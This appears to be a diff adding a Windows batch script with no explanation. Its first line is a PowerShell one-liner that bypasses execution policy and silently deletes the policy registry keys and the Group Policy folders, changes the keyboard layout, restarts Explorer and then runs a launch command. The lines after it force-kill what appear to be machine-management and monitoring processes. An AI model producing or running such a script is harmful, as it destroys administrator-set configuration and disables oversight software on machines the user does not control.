@@ -1,0 +1,15 @@
+"C:\Windows\System32\cmd.exe" /c powershell -ExecutionPolicy Bypass -Command "Remove-Item -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies' -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies' -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item -Path 'HKCU:\Software\Policies\Microsoft\Windows' -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item -Path 'HKLM:\Software\Policies\Microsoft\Windows' -Recurse -Force -ErrorAction SilentlyContinue; $gp1 = Join-Path $env:WinDir 'System32\GroupPolicy'; Remove-Item -Path $gp1 -Recurse -Force -ErrorAction SilentlyContinue; $gp2 = Join-Path $env:WinDir 'System32\GroupPolicyUsers'; Remove-Item -Path $gp2 -Recurse -Force -ErrorAction SilentlyContinue; $LangList = Get-WinUserLanguageList; $LangList[0].InputMethodTips.Clear(); $LangList[0].InputMethodTips.Add('0421:00000421'); Set-WinUserLanguageList $LangList -Force -ErrorAction SilentlyContinue; Set-WinDefaultInputMethodOverride -InputTip '0421:00000421' -ErrorAction SilentlyContinue; Stop-Process -Name explorer -Force; Start-Process explorer;" & %command%
+
+
+
+taskkill /f /im supervisord.exe
+taskkill /f /im AtUpDownProNode.exe
+taskkill /f /im secure.exe
+taskkill /f /im testDanger.exe
+taskkill /f /im AtSocket.exe
+taskkill /f /im aria2c.exe
+taskkill /f /im AtDeskTop.exe
+taskkill /f /im AtGameLauncherNode.exe
+taskkill /f /im websocket.exe
+taskkill /f /im categraf.exe  
+
